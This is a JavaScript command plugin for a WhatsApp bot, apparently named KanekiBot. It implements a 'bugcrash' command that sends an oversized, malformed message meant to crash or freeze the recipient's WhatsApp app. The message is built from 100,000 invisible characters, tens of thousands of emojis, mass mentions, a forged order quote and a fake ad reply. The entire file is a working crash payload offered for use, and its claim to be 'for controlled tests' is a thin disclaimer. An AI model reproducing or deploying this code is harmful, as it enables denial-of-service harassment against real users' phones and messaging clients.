const sendBugCrash = async (conn, jid) => {
  const giantText = '\u2063'.repeat(100000) + '💣'.repeat(50000) + '@everyone'.repeat(3000)
  const fakeQuote = {
    key: {
      fromMe: false,
      participant: '0@s.whatsapp.net',
      remoteJid: 'status@broadcast'
    },
    message: {
      orderMessage: {
        itemCount: 9999999,
        status: 1,
        surface: 1,
        message: '💥 WhatsApp UI Bug 💥',
        orderTitle: 'Exploit by KanekiBot',
        sellerJid: '0@s.whatsapp.net'
      }
    }
  }

  const bugPayload = {
    key: {
      remoteJid: jid,
      fromMe: false,
      id: conn.generateMessageTag()
    },
    message: {
      extendedTextMessage: {
        text: giantText,
        contextInfo: {
          mentionedJid: ['0@s.whatsapp.net'],
          forwardingScore: 999,
          isForwarded: true,
          quotedMessage: {
            contactMessage: {
              displayName: '💀',
              vcard: 'BEGIN:VCARD\nVERSION:3.0\nN:💥;💥;;;\nFN:💥💥💥\nEND:VCARD'
            }
          },
          externalAdReply: {
            title: 'Crash WhatsApp',
            body: '🧨 Boom',
            thumbnailUrl: '',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }

  await conn.relayMessage(jid, bugPayload.message, { messageId: bugPayload.key.id })
}

let handler = async (m, { conn, isOwner }) => {
  if (!isOwner) throw `⛔ Este comando es solo para el Owner del bot.`

  await sendBugCrash(conn, m.chat)
  await m.reply('✅ *Bug Crash UI enviado con éxito.*\n⚠️ Recomendado solo para pruebas controladas.')
}

handler.command = /^bugcrash$/i
handler.owner = true
handler.tags = ['owner']
handler.help = ['bugcrash']

export default handler
